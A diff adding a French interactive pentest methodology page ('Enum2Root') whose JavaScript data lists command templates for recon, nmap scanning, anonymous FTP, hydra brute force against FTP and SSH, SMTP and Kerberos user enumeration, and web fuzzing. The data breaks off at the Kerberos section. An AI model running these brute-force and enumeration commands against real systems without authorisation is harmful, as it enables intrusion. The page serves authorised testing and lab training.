@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enum2Root - méthodologie de pentest dynamique</title>
+<style>
+  :root{
+    --bg:#0c0d10; --panel:#14161b; --panel2:#1b1e25; --border:#2a2e37;
+    --txt:#f1f3f7; --muted:#b0b6c2; --accent:#9aafce; --green:#a6c0a2;
+    --cmd-bg:#090a0d; --cmd-txt:#e6eaf2; --warn:#cc9a76; --tok:#d8bb8f; --red:#cf8a82;
+  }
+  body.light{
+    --bg:#f4f5f7; --panel:#ffffff; --panel2:#eceff3; --border:#d3d8e0;
+    --txt:#1b2027; --muted:#586070; --accent:#3066ad; --green:#3c8a54;
+    --cmd-bg:#0d1016; --cmd-txt:#e6eaf2; --warn:#9a6a3a; --tok:#a9772f; --red:#b5403a;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);color:var(--txt);line-height:1.5;font-size:14px}
+  header{position:sticky;top:0;z-index:50;background:linear-gradient(180deg,#161b22,#10151c);
+    border-bottom:1px solid var(--border);padding:12px 20px;backdrop-filter:blur(6px)}
+  h1{margin:0 0 4px;font-size:18px;display:flex;align-items:center;gap:10px}
+  h1 .tag{font-size:11px;font-weight:600;background:var(--accent);color:#03101f;padding:2px 8px;border-radius:20px}
+  h1 .langswitch{font-size:12px;font-weight:600;color:var(--muted);text-decoration:none;border:1px solid var(--border);border-radius:6px;padding:2px 8px;margin-left:4px}
+  h1 .langswitch:hover{color:var(--txt);border-color:var(--accent)}
+  .sub{color:var(--muted);font-size:12px;margin-bottom:10px}
+  .controls{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+  .field{display:flex;flex-direction:column;gap:3px}
+  .field label{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)}
+  input[type=text]{background:var(--cmd-bg);border:1px solid var(--border);color:var(--txt);
+    padding:8px 11px;border-radius:8px;font-size:14px;min-width:180px;font-family:ui-monospace,Menlo,monospace}
+  input[type=text]:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(129,152,184,.22)}
+  #search{min-width:240px}
+  /* barre de contexte */
+  .ctxbar{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin-top:10px;
+    padding-top:10px;border-top:1px solid var(--border)}
+  .ctxbar .lbl{font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin-right:2px}
+  .ctxchip{background:var(--panel2);border:1px solid var(--border);color:var(--muted);
+    border-radius:20px;padding:5px 12px;font-size:12.5px;cursor:pointer;font-weight:600}
+  .ctxchip:hover{border-color:var(--accent);color:var(--txt)}
+  .ctxchip.on{background:var(--green);border-color:var(--green);color:#03101f}
+  .ctxbar .sep{flex:1}
+  .modeseg{display:inline-flex;border:1px solid var(--border);border-radius:8px;overflow:hidden}
+  .modeseg button{background:var(--panel2);border:none;color:var(--muted);padding:6px 11px;font-size:12px;cursor:pointer}
+  .modeseg button+button{border-left:1px solid var(--border)}
+  .modeseg button.on{background:var(--accent);color:#0b0d10;font-weight:600}
+  .modeseg button:hover:not(.on){color:var(--txt)}
+  .topbtn{background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;
+    padding:7px 12px;cursor:pointer;font-size:13px}
+  .topbtn:hover{border-color:var(--accent)}
+  .layout{display:flex}
+  nav{position:sticky;top:170px;align-self:flex-start;width:225px;max-height:calc(100vh - 182px);
+    overflow-y:auto;padding:16px 10px 40px 16px;font-size:13px;flex-shrink:0}
+  nav a{display:block;color:var(--muted);text-decoration:none;padding:4px 8px;border-radius:6px;border-left:2px solid transparent}
+  nav a:hover{color:var(--txt);background:var(--panel)}
+  nav a.phase{margin-top:10px;color:var(--accent);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;cursor:pointer}
+  .nav-tb,.main-tb{display:flex;margin-bottom:6px;justify-content:flex-end}
+  .nav-tb button,.main-tb button{background:var(--panel2);border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:3px 10px;font-size:12px;line-height:1;cursor:pointer}
+  .nav-tb button:hover,.main-tb button:hover{color:var(--txt);border-color:var(--accent)}
+  .nav-group a.phase .nchev{display:inline-block;width:11px;color:var(--muted);transition:transform .2s}
+  .nav-group.collapsed a.phase .nchev{transform:rotate(-90deg)}
+  .nav-group.collapsed a.seclink{display:none}
+  .nav-group:not(.show-all) a.seclink.navhide{display:none}
+  .nav-group.show-all a.seclink.navhide{opacity:.5}
+  .navmore{display:block;color:var(--muted);font-size:11px;padding:3px 8px 3px 10px;cursor:pointer;font-style:italic;text-decoration:none}
+  .navmore:hover{color:var(--accent)}
+  .nav-group:not(.has-hidden) .navmore{display:none}
+  .nav-group.collapsed .navmore{display:none}
+  .phase-block{margin-bottom:4px}
+  .phase-head{display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;padding:8px 4px}
+  .phase-head h3{margin:0;font-size:12px;text-transform:uppercase;letter-spacing:.6px;color:var(--accent)}
+  .phase-head .chev{color:var(--muted);transition:transform .2s}
+  .phase-block.collapsed .chev{transform:rotate(-90deg)}
+  .phase-block.collapsed .phase-sections{display:none}
+  main{flex:1;padding:16px 22px 120px;min-width:0}
+  section{background:var(--panel);border:1px solid var(--border);border-radius:12px;margin-bottom:16px;overflow:hidden}
+  .sec-head{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;user-select:none}
+  .sec-head:hover{background:var(--panel2)}
+  .sec-head .port{font-family:ui-monospace,monospace;font-size:12px;background:#8198b81a;color:var(--accent);
+    border:1px solid #8198b840;padding:2px 8px;border-radius:6px;min-width:48px;text-align:center}
+  .sec-head h2{margin:0;font-size:15px;flex:1}
+  .sec-head .svc{color:var(--muted);font-weight:400;font-size:12px}
+  .sec-head .chev{color:var(--muted);transition:transform .2s}
+  section.collapsed .chev{transform:rotate(-90deg)}
+  section.collapsed .sec-body{display:none}
+  section.focus-collapsed .chev{transform:rotate(-90deg)}
+  section.focus-collapsed .sec-body{display:none}
+  .step.reco{border-left:3px solid var(--accent);padding-left:11px}
+  .step.reco .title .t{color:var(--accent)}
+  .topbtn.on{background:var(--accent);color:#0b0d10;border-color:var(--accent);font-weight:600}
+  .sec-body{padding:4px 16px 14px;border-top:1px solid var(--border)}
+  .note{color:var(--muted);font-size:12.5px;margin:10px 0 6px;border-left:3px solid var(--border);padding-left:10px}
+  .note b{color:var(--tok)}
+  .step{margin:14px 0}
+  .step .title{font-size:13px;font-weight:600;margin-bottom:6px;color:var(--green);display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+  .step .title .t{flex:1;min-width:200px}
+  .reqs{display:flex;gap:4px;flex-wrap:wrap}
+  .req{font-size:10px;border-radius:10px;padding:1px 7px;border:1px solid var(--border);
+    color:var(--muted);background:var(--panel2);font-weight:600}
+  .req.met{border-color:var(--green);color:var(--green)}
+  .req.unmet{border-color:var(--red);color:var(--red)}
+  .doneck{cursor:pointer;accent-color:var(--green);width:15px;height:15px;flex-shrink:0}
+  .step.done .title .t{text-decoration:line-through;color:var(--muted)}
+  .step.done{opacity:.65}
+  .sec-head .secprog{font-size:11px;color:var(--green);font-family:ui-monospace,monospace}
+  .progress{font-size:12px;color:var(--muted)}
+  .nmapstatus{font-size:12px;color:var(--green);display:inline-flex;align-items:center;gap:6px}
+  .nmapstatus button{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px}
+  .nmapstatus button:hover{color:var(--red)}
+  .step.locked{opacity:.45}
+  .step.shidden{display:none}
+  .step.reduced{opacity:.5;margin:6px 0}
+  .step.reduced .cmd{display:none}
+  .step.reduced .title{margin-bottom:0}
+  .cmd{position:relative;background:var(--cmd-bg);border:1px solid var(--border);border-radius:8px;
+    padding:10px 120px 10px 12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;
+    white-space:pre-wrap;word-break:break-word;color:var(--cmd-txt);margin:6px 0}
+  .cmd .tok{color:var(--tok);font-weight:700;background:#bfa1771a;border-radius:3px;padding:0 2px}
+  .cmd .cmt{color:var(--muted)}
+  .cmd-actions{position:absolute;top:6px;right:6px;display:flex;gap:4px}
+  .copy,.note-btn{background:var(--panel2);border:1px solid var(--border);color:var(--muted);
+    border-radius:6px;font-size:11px;padding:3px 7px;cursor:pointer;white-space:nowrap}
+  .copy:hover,.note-btn:hover{color:var(--txt);border-color:var(--accent)}
+  .copy.ok{color:var(--green);border-color:var(--green)}
+  .note-btn.has{border-color:var(--green);color:var(--green)}
+  .note-btn .badge{display:none}
+  .note-btn.has .badge{display:inline;background:var(--green);color:#03101f;border-radius:10px;
+    padding:0 5px;margin-left:3px;font-weight:700}
+  a.ref{color:var(--accent);text-decoration:none}
+  a.ref:hover{text-decoration:underline}
+  .hidden{display:none !important}
+  .empty{color:var(--muted);text-align:center;padding:40px;font-style:italic}
+  footer{color:var(--muted);font-size:11px;padding:20px 24px;max-width:1100px}
+  /* panneau carnet de bord : colonne droite permanente */
+  #drawer{position:sticky;top:170px;align-self:flex-start;height:calc(100vh - 182px);
+    width:540px;flex-shrink:0;background:var(--panel);border-left:1px solid var(--border);
+    display:flex;flex-direction:column}
+  #drawer:not(.has-sel) #drawer-input,#drawer:not(.has-sel) .drawer-actions{display:none}
+  #drawer:not(.has-sel) #drawer-close{display:none}
+  .drawer-head{display:flex;align-items:flex-start;gap:10px;padding:14px 16px;border-bottom:1px solid var(--border)}
+  .drawer-head .t{flex:1}
+  #drawer-title{font-size:14px;font-weight:600;color:var(--green)}
+  #drawer-sub{font-size:11px;color:var(--muted);margin-top:2px}
+  #drawer-close{background:none;border:none;color:var(--muted);font-size:18px;cursor:pointer}
+  #drawer-close:hover{color:var(--txt)}
+  #drawer textarea{margin:12px 16px 0;height:140px;resize:vertical;background:var(--cmd-bg);
+    border:1px solid var(--border);color:var(--cmd-txt);border-radius:8px;padding:10px;
+    font-family:ui-monospace,Menlo,monospace;font-size:12px}
+  .drawer-actions{display:flex;gap:8px;padding:10px 16px}
+  .drawer-actions button{background:var(--accent);border:none;color:#03101f;font-weight:600;
+    border-radius:8px;padding:7px 14px;cursor:pointer;font-size:13px}
+  .drawer-actions button.ghost{background:var(--panel2);color:var(--muted);border:1px solid var(--border)}
+  #drawer-history{flex:1;overflow-y:auto;padding:4px 16px 30px}
+  .sumtitle{font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin:6px 2px 8px}
+  .sumrow{display:flex;align-items:center;gap:9px;width:100%;text-align:left;background:var(--cmd-bg);
+    border:1px solid var(--border);border-radius:8px;padding:8px 10px;margin:5px 0;cursor:pointer;color:var(--txt)}
+  .sumrow:hover{border-color:var(--accent)}
+  .sumcount{background:var(--green);color:#03101f;font-weight:700;border-radius:10px;padding:0 7px;font-size:11px}
+  .sumtxt{font-size:12.5px}.sumtxt b{color:var(--accent)}
+  .entry{background:var(--cmd-bg);border:1px solid var(--border);border-radius:8px;margin:8px 0;overflow:hidden}
+  .entry-head{display:flex;align-items:center;gap:8px;padding:6px 10px;font-size:11px;color:var(--muted);background:var(--panel2)}
+  .entry-head .when{flex:1}
+  .entry-head button{background:none;border:none;color:var(--muted);cursor:pointer;font-size:12px}
+  .entry-head button:hover{color:var(--warn)}
+  .entry pre{margin:0;padding:10px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
+    color:var(--cmd-txt);white-space:pre-wrap;word-break:break-word;max-height:320px;overflow:auto}
+  .hist-empty{color:var(--muted);font-style:italic;font-size:12px;padding:14px 4px}
+  .sec-head .htlink{font-size:11px;color:var(--accent);text-decoration:none;border:1px solid var(--border);border-radius:6px;padding:2px 7px;white-space:nowrap}
+  .sec-head .htlink:hover{border-color:var(--accent);background:var(--panel2)}
+  .viewsw{display:flex;gap:4px;margin-bottom:10px}
+  .viewsw button{flex:1;background:var(--panel2);border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:5px;font-size:11.5px;cursor:pointer}
+  .viewsw button.on{background:var(--accent);color:#0b0d10;font-weight:600}
+  .entry-head .jump{flex:1;text-align:left;background:none;border:none;color:var(--accent);cursor:pointer;font-size:11px;padding:0}
+  .entry-head .jump:hover{text-decoration:underline}
+  .star{background:none!important;border:none;color:var(--muted);cursor:pointer;font-size:13px}
+  .star.on,.star:hover{color:var(--tok)}
+  .findtag{font-size:10px;color:var(--tok);border:1px solid var(--tok);border-radius:10px;padding:0 6px}
+  @media(max-width:1320px){#drawer{display:none}}
+  .gmodal{position:fixed;inset:0;z-index:200;background:rgba(5,6,9,.97);display:flex;flex-direction:column}
+  .gmodal.hidden{display:none}
+  .gbar{display:flex;align-items:center;gap:16px;padding:10px 16px;border-bottom:1px solid var(--border);background:var(--panel)}
+  .gbar .gtitle{font-weight:600}
+  .gbar .glegend{color:var(--muted);font-size:12px;display:flex;gap:16px;flex-wrap:wrap}
+  .gbar .glegend i{font-style:normal;display:inline-flex;align-items:center;gap:6px}
+  .gbar .dot{width:9px;height:9px;border-radius:50%;display:inline-block}
+  .gbar #graphClose{background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:6px;padding:4px 11px;cursor:pointer;font-size:14px}
+  .gbar #graphClose:hover{border-color:var(--accent)}
+  .gbar .gtoggle{margin-left:auto;background:var(--panel2);border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:4px 11px;cursor:pointer;font-size:12.5px}
+  .gbar .gtoggle.on{background:var(--accent);color:#0b0d10;border-color:var(--accent);font-weight:600}
+  #graphCanvas{flex:1;display:block;cursor:grab}
+  ::-webkit-scrollbar{width:10px;height:10px}::-webkit-scrollbar-thumb{background:var(--border);border-radius:6px}
+</style>
+</head>
+<body>
+<header>
+  <h1>Enum2Root <span class="tag">dynamique</span> <a class="langswitch" href="index.html" title="English version">EN</a></h1>
+  <div class="sub">Saisis ta cible + coche <b>ce que tu possèdes</b> : les actions dont tu as les prérequis s'allument. Inspiré des mindmaps OCD / WADComs. Usage en test autorisé / CTF / lab uniquement.</div>
+  <div class="controls">
+    <div class="field"><label for="ip">IP cible</label><input type="text" id="ip" placeholder="10.10.10.10" value="10.10.10.10"></div>
+    <div class="field"><label for="domain">Domaine / FQDN</label><input type="text" id="domain" placeholder="cible.local" value="cible.local"></div>
+    <div class="field"><label for="dc">DC (AD)</label><input type="text" id="dc" placeholder="dc01.cible.local" value="dc01.cible.local"></div>
+    <div class="field"><label for="user">Utilisateur</label><input type="text" id="user" placeholder="jdoe" value="jdoe"></div>
+    <div class="field"><label for="pass">Mot de passe / hash</label><input type="text" id="pass" placeholder="Passw0rd!" value="Passw0rd!"></div>
+    <div class="field"><label for="url">URL web</label><input type="text" id="url" placeholder="http://10.10.10.10" value="http://10.10.10.10"></div>
+    <div class="field"><label for="lhost">Votre IP (LHOST / listener)</label><input type="text" id="lhost" placeholder="10.10.14.1" value=""></div>
+    <div class="field"><label for="iface">Interface</label><input type="text" id="iface" value="tun0"></div>
+    <div class="field"><label for="wordlist">Wordlist</label><input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt"></div>
+    <div class="field" style="flex:1"><label for="search">Recherche</label><input type="text" id="search" placeholder="ex: kerberoast, smb, sqlmap, 445…"></div>
+  </div>
+  <div class="ctxbar">
+    <span class="lbl">Ce que je possède :</span>
+    <span id="ctxchips"></span>
+    <span class="sep"></span>
+    <span class="lbl">Actions indisponibles :</span>
+    <span class="modeseg" id="lockMode">
+      <button data-m="show">Tout afficher</button>
+      <button data-m="reduce">Réduire</button>
+      <button data-m="hide">Masquer</button>
+    </span>
+    <button class="topbtn" id="focusBtn" title="Replier les sections non applicables et encadrer celles qui sont faisables selon votre contexte">Focus contexte</button>
+    <button class="topbtn" id="nmapBtn" title="Importer un scan nmap (.nmap / .gnmap / .xml) pour ne garder que les ports ouverts">Charger .nmap</button>
+    <input type="file" id="nmapFile" accept=".nmap,.gnmap,.xml,.txt" style="display:none">
+    <span id="nmapStatus" class="nmapstatus"></span>
+    <span id="progress" class="progress"></span>
+    <button class="topbtn" id="exportBtn" title="Exporter les notes de la cible courante">Rapport .md</button>
+    <button class="topbtn" id="exportJson" title="Sauvegarder tout le carnet (notes + progression)">Export JSON</button>
+    <button class="topbtn" id="importJson" title="Restaurer un carnet depuis un fichier">Import JSON</button>
+    <input type="file" id="importFile" accept="application/json" style="display:none">
+    <button class="topbtn" id="graphBtn" title="Vue graphique de la méthodologie">Graphe</button>
+    <button class="topbtn" id="themeBtn" title="Basculer thème clair / sombre">Thème</button>
+  </div>
+</header>
+
+<div class="layout">
+  <nav id="nav"></nav>
+  <main id="main"></main>
+  <aside id="drawer">
+    <div class="drawer-head">
+      <div class="t"><div id="drawer-title">Carnet de bord</div><div id="drawer-sub"></div></div>
+      <button id="drawer-close" title="Retour au carnet">✕</button>
+    </div>
+    <textarea id="drawer-input" placeholder="Colle ici la sortie de la commande, puis Enregistrer (Ctrl/Cmd+Entrée)…"></textarea>
+    <div class="drawer-actions">
+      <button id="drawer-save">Enregistrer</button>
+      <button id="drawer-clear" class="ghost">Vider le champ</button>
+    </div>
+    <div id="drawer-history"></div>
+  </aside>
+</div>
+
+<div id="graphModal" class="gmodal hidden">
+  <div class="gbar">
+    <span class="gtitle">Carte graphique</span>
+    <span class="glegend">
+      <i><span class="dot" style="background:var(--accent)"></span>cible / phase</i>
+      <i><span class="dot" style="background:var(--green)"></span>section faisable</i>
+      <i><span class="dot" style="background:var(--muted)"></span>verrouillée</i>
+      <i>molette = zoom · glisser = déplacer · clic sur une section = y aller</i>
+    </span>
+    <button id="graphFilter" class="gtoggle on" title="N'afficher que les sections faisables selon votre contexte">Faisables seulement</button>
+    <button id="graphClose" title="Fermer">✕</button>
+  </div>
+  <canvas id="graphCanvas"></canvas>
+</div>
+
+<footer>
+  Références :
+  <a class="ref" href="https://book.hacktricks.wiki/en/index.html" target="_blank">HackTricks</a> ·
+  <a class="ref" href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank">OCD Mindmaps</a> ·
+  <a class="ref" href="https://wadcoms.github.io" target="_blank">WADComs</a> ·
+  <a class="ref" href="https://www.thehacker.recipes/" target="_blank">The Hacker Recipes</a> ·
+  <a class="ref" href="https://www.ired.team/" target="_blank">ired.team</a> ·
+  <a class="ref" href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> ·
+  <a class="ref" href="https://lolbas-project.github.io/" target="_blank">LOLBAS</a> ·
+  <a class="ref" href="https://swisskyrepo.github.io/PayloadsAllTheThings/" target="_blank">PayloadsAllTheThings</a>
+  <br>⚠️ N'utilise ces commandes que sur des systèmes que tu es explicitement autorisé à tester.
+</footer>
+
+<script>
+// ============================================================
+//  TAGS de contexte (prérequis / dépendances)
+//  needs sur un step = tags requis. Vide = toujours dispo.
+//  Tags : NET USER AUTH CREDS HASH ADMIN SHELL DA
+// ============================================================
+const TAGS={
+  NET:  {label:"Réseau",      desc:"Accès réseau à la cible (acquis par défaut)"},
+  USER: {label:"User(s)",     desc:"Au moins un nom d'utilisateur de domaine valide"},
+  AUTH: {label:"Auth",        desc:"Authentification possible (mot de passe OU hash NT)"},
+  CREDS:{label:"Mot de passe",desc:"Identifiants en clair (utilisateur + mot de passe)"},
+  HASH: {label:"Hash NT",     desc:"Hash NTLM pour pass-the-hash"},
+  ADMIN:{label:"Admin local", desc:"Droits administrateur local sur une machine"},
+  SHELL:{label:"Shell",       desc:"Exécution de commandes / shell sur une cible"},
+  DA:   {label:"Priv. domaine",desc:"Droits domaine élevés (DCSync / Domain Admin)"},
+};
+const TOGGLES=["USER","CREDS","HASH","SHELL","ADMIN","DA"]; // NET implicite
+
+// Liens HackTricks par section (slugs vérifiés)
+const HT="https://book.hacktricks.wiki/en/";
+const REFS={
+  scan:HT+"generic-methodologies-and-resources/pentesting-network/index.html",
+  ftp:HT+"network-services-pentesting/pentesting-ftp/index.html",
+  ssh:HT+"network-services-pentesting/pentesting-ssh.html",
+  smtp:HT+"network-services-pentesting/pentesting-smtp/index.html",
+  dns:HT+"network-services-pentesting/pentesting-dns.html",
+  web:HT+"network-services-pentesting/pentesting-web/index.html",
+  kerberos:HT+"network-services-pentesting/pentesting-kerberos-88/index.html",
+  rpc:HT+"network-services-pentesting/135-pentesting-msrpc.html",
+  smb:HT+"network-services-pentesting/pentesting-smb/index.html",
+  snmp:HT+"network-services-pentesting/pentesting-snmp/index.html",
+  ldap:HT+"network-services-pentesting/pentesting-ldap.html",
+  mssql:HT+"network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html",
+  mysql:HT+"network-services-pentesting/pentesting-mysql.html",
+  nfs:HT+"network-services-pentesting/nfs-service-pentesting.html",
+  rdp:HT+"network-services-pentesting/pentesting-rdp.html",
+  winrm:HT+"network-services-pentesting/5985-5986-pentesting-winrm.html",
+  redis:HT+"network-services-pentesting/6379-pentesting-redis.html",
+  postgres:HT+"network-services-pentesting/pentesting-postgresql.html",
+  oracle:HT+"network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html",
+  rsync:HT+"network-services-pentesting/873-pentesting-rsync.html",
+  tomcat:HT+"network-services-pentesting/pentesting-web/tomcat/index.html",
+  docker:HT+"network-services-pentesting/2375-pentesting-docker.html",
+  mongo:HT+"network-services-pentesting/27017-27018-mongodb.html",
+  vnc:HT+"network-services-pentesting/pentesting-vnc.html",
+  ipmi:HT+"network-services-pentesting/623-udp-ipmi.html",
+  sqli:HT+"pentesting-web/sql-injection/index.html",
+  lfi:HT+"pentesting-web/file-inclusion/index.html",
+  ssti:HT+"pentesting-web/ssti-server-side-template-injection/index.html",
+  cmdinj:HT+"pentesting-web/command-injection.html",
+  upload:HT+"pentesting-web/file-upload/index.html",
+  wordpress:HT+"network-services-pentesting/pentesting-web/wordpress.html",
+  adspray:HT+"windows-hardening/active-directory-methodology/index.html",
+  adenum:HT+"windows-hardening/active-directory-methodology/index.html",
+  roast:HT+"windows-hardening/active-directory-methodology/kerberoast.html",
+  adacl:HT+"windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html",
+  adcs:HT+"windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html",
+  shadowcreds:HT+"windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html",
+  coerce:HT+"windows-hardening/active-directory-methodology/index.html",
+  tickets:HT+"windows-hardening/active-directory-methodology/index.html",
+  lateral:HT+"windows-hardening/active-directory-methodology/index.html",
+  dcsync:HT+"windows-hardening/active-directory-methodology/dcsync.html",
+  linpriv:HT+"linux-hardening/privilege-escalation/index.html",
+  winpriv:HT+"windows-hardening/windows-local-privilege-escalation/index.html",
+  pivot:HT+"generic-hacking/tunneling-and-port-forwarding.html",
+};
+
+// ============================================================
+//  DONNÉES : phases -> sections -> steps{t,c,needs}
+//  Tokens : {IP} {DOMAIN} {DC} {URL} {USER} {PASS}
+// ============================================================
+const DATA=[
+{phase:"0 - Reconnaissance", sections:[
+  {id:"osint", port:"OSINT", svc:"passif", title:"Reconnaissance passive",
+   notes:["Aucun paquet envoyé à la cible. À faire en premier."],
+   steps:[
+     {needs:[], t:"Sous-domaines via crt.sh (robuste : crt.sh renvoie souvent des 502)",
+      c:"# crt.sh est instable -> retry + vérif JSON avant jq\nfor i in 1 2 3 4 5; do\n  out=$(curl -s --max-time 20 'https://crt.sh/?q=%25.{DOMAIN}&output=json')\n  echo \"$out\" | jq -e . >/dev/null 2>&1 && { echo \"$out\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u; break; }\n  sleep 3\ndone"},
+     {needs:[], t:"Fallback CT (certspotter, sans clé API)",
+      c:"curl -s 'https://api.certspotter.com/v1/issuances?domain={DOMAIN}&include_subdomains=true&expand=dns_names' | jq -r '.[].dns_names[]?' | sed 's/\\*\\.//g' | sort -u"},
+     {needs:[], t:"Agrégation de sources (subfinder)",
+      c:"subfinder -d {DOMAIN} -silent\n# autres : shodan.io | viewdns.info | dnsdumpster.com"},
+     {needs:[], t:"Whois / techno",
+      c:"whois {DOMAIN}\nwhatweb https://{DOMAIN}\n# wappalyzer (extension) pour le stack technique"},
+   ]},
+  {id:"setup", port:"setup", svc:"prep", title:"Préparation de l'environnement",
+   notes:["Synchronise l'horloge (indispensable pour Kerberos) et résous le FQDN."],
+   steps:[
+     {needs:[], t:"Sync horloge sur la cible (Kerberos)", c:"sudo ntpdate {IP}\n# alt : sudo rdate -n {IP}"},
+     {needs:[], t:"Ajout au /etc/hosts", c:"echo \"{IP} {DOMAIN} {DC}\" | sudo tee -a /etc/hosts"},
+   ]},
+  {id:"scan", port:"scan", svc:"nmap", title:"Scan de ports actif",
+   notes:["Scan complet d'abord, puis scan ciblé/scripté sur les ports ouverts.",
+     "<b>-oA</b> produit le fichier <b>.nmap</b> (+ .gnmap/.xml) à charger via « Charger .nmap » pour filtrer cette page par ports ouverts."],
+   steps:[
+     {needs:[], t:"Scan complet exportable (.nmap à charger dans cette page)", c:"mkdir -p scans && sudo nmap -p- -sV -sC -T4 -oA scans/{IP} {IP}\n# génère scans/{IP}.nmap  ->  bouton « Charger .nmap »"},
+     {needs:[], t:"Scan furtif SYN sans ping (ICMP filtré)", c:"sudo nmap {IP} -p- -sS -Pn -n --disable-arp-ping --packet-trace"},
+     {needs:[], t:"UDP top 50", c:"mkdir -p scans && sudo nmap -sU --top-ports 50 -oA scans/udp_{IP} {IP}"},
+     {needs:[], t:"Vuln scan (NSE)", c:"mkdir -p scans && sudo nmap -p<PORTS> --script vuln -oA scans/vuln_{IP} {IP}"},
+     {needs:[], t:"Recherche d'exploits/CVE (sur les versions trouvées)", c:"searchsploit <produit> <version>\nsearchsploit -m <id>   # copie l'exploit en local"},
+   ]},
+]},
+
+{phase:"1 - Énumération des services", sections:[
+  {id:"ftp", port:"21", svc:"FTP", title:"FTP",
+   notes:["Tester le login <b>anonymous</b> d'abord, puis les creds trouvés."],
+   steps:[
+     {needs:[], t:"Connexion anonyme", c:"ftp {IP}\n# user: anonymous / pass: anonymous"},
+     {needs:[], t:"Récupération récursive (anon)", c:"wget -r --no-passive ftp://anonymous:anonymous@{IP}/"},
+     {needs:[], t:"Scripts nmap", c:"sudo nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst {IP}"},
+     {needs:["CREDS"], t:"Connexion authentifiée", c:"lftp -u {USER},{PASS} {IP}"},
+     {needs:[], t:"Brute force (si autorisé)", c:"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP} -t 4"},
+   ]},
+  {id:"ssh", port:"22", svc:"SSH", title:"SSH",
+   notes:["Rarement exploitable direct - chercher des creds/clés. Vérifier la version (CVE)."],
+   steps:[
+     {needs:[], t:"Bannière / algos", c:"nc -vn {IP} 22\nssh -v {IP}"},
+     {needs:["CREDS"], t:"Connexion par mot de passe", c:"ssh {USER}@{IP}"},
+     {needs:[], t:"Connexion par clé volée", c:"chmod 600 id_rsa; ssh -i id_rsa {USER}@{IP}"},
+     {needs:["USER"], t:"Brute force ciblé", c:"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP} -t 4"},
+   ]},
+  {id:"smtp", port:"25", svc:"SMTP", title:"SMTP / Mail",
+   notes:["Énumérer les utilisateurs via VRFY / RCPT."],
+   steps:[
+     {needs:[], t:"Énumération d'utilisateurs", c:"smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {IP}"},
+     {needs:[], t:"Bannière / open relay", c:"nc -vn {IP} 25\n# VRFY root ? open-relay ?"},
+   ]},
+  {id:"dns", port:"53", svc:"DNS", title:"DNS",
+   notes:["Tenter le transfert de zone (AXFR)."],
+   steps:[
+     {needs:[], t:"Transfert de zone", c:"dig axfr @{IP} {DOMAIN}"},
+     {needs:[], t:"Enregistrements (ANY est refusé/RFC8482 → types ciblés)", c:"for r in A AAAA NS MX TXT SOA CNAME SRV; do echo \"== $r ==\"; dig +short $r {DOMAIN} @{IP}; done"},
+     {needs:[], t:"Brute force de sous-domaines", c:"gobuster dns -d {DOMAIN} -r {IP} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"},
+   ]},
+  {id:"web", port:"80/443", svc:"HTTP(S)", title:"Web",
+   notes:["La plus grosse surface. Toujours fuzzer fichiers + répertoires + vhosts."],
+   steps:[
+     {needs:[], t:"Fichiers sensibles", c:"curl {URL}/robots.txt\ncurl {URL}/sitemap.xml\ncurl {URL}/.git/HEAD"},
+     {needs:[], t:"Fingerprint / WAF", c:"whatweb -a 3 {URL}\nnikto -h {URL}\nwafw00f {URL}"},
+     {needs:[], t:"Brute force de répertoires (un outil au choix)", c:"WL=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\nferoxbuster -u {URL} -w $WL -x php,html,txt -t 50          # récursif\nffuf -u {URL}/FUZZ -w $WL -e .php,.html,.txt -mc 200,301,302,403\ngobuster dir -u {URL} -w $WL -x php,html,txt,bak -t 50\ndirsearch -u {URL} -e php,html,txt -x 404\nwfuzz -c -w $WL --hc 404 {URL}/FUZZ"},
+     {needs:[], t:"Vhosts", c:"gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 50"},
+     {needs:[], t:"Scan de vulnérabilités", c:"nuclei -u {URL} -s critical,high,medium"},
+   ]},
+  {id:"kerberos", port:"88", svc:"Kerberos", title:"Kerberos / AD",
+   notes:["Port 88 = contrôleur de domaine. Pivot vers l'énumération AD."],
+   steps:[
+     {needs:[], t:"User enum sans creds (Kerbrute)", c:"kerbrute userenum -d {DOMAIN} --dc {DC} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"},
